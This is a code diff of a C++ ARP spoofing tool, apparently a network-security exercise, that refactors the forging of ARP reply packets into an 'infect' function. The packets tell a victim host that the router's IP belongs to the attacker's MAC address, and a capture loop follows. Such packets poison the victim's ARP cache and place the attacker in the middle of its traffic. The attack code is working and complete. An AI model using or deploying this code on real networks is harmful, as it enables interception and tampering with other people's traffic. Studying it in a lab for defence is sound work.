@@ -130,6 +130,26 @@ Mac getMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
 }
 
 
+void infect(pcap_t* pcap, Mac attackerMac, const Flow& flow) {
+	EthArpPacket packet;
+
+	packet.eth_.dmac_ = flow.senderMac;
+	packet.eth_.smac_ = attackerMac;
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::Size;
+	packet.arp_.pln_ = Ip::Size;
+	packet.arp_.op_ = htons(ArpHdr::Reply);
+	packet.arp_.smac_ = attackerMac;
+	packet.arp_.sip_ = htonl(flow.targetIp);
+	packet.arp_.tmac_ = flow.senderMac;
+	packet.arp_.tip_ = htonl(flow.senderIp);
+
+	pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+}
+
 int main(int argc, char* argv[]) {
 	if (!parse(&param, argc, argv))
 		return EXIT_FAILURE;
@@ -164,29 +184,8 @@ int main(int argc, char* argv[]) {
 		Mac targetMac = getMac(pcap, attackerMac, attackerIp, targetIp);
 		printf("Target MAC: %s\n", std::string(targetMac).c_str());
 
-		// 5. Sender에게 ARP Infect 패킷 전송
-		EthArpPacket packet;
-
-		packet.eth_.dmac_ = senderMac;
-		packet.eth_.smac_ = attackerMac;
-		packet.eth_.type_ = htons(EthHdr::Arp);
-
-		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-		packet.arp_.pro_ = htons(EthHdr::Ip4);
-		packet.arp_.hln_ = Mac::Size;
-		packet.arp_.pln_ = Ip::Size;
-		packet.arp_.op_ = htons(ArpHdr::Reply);
-		packet.arp_.smac_ = attackerMac; // smac은 공격자 MAC 주소
-		packet.arp_.sip_ = htonl(targetIp); // sip은 라우터 IP 주소 
-		packet.arp_.tmac_ = senderMac;
-		packet.arp_.tip_ = htonl(senderIp);
-
-		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-		}
-
 		flows.push_back({senderIp, senderMac, targetIp, targetMac});
+		infect(pcap, attackerMac, flows.back());
 	}
 
 	// 6. 패킷 캡처 루프
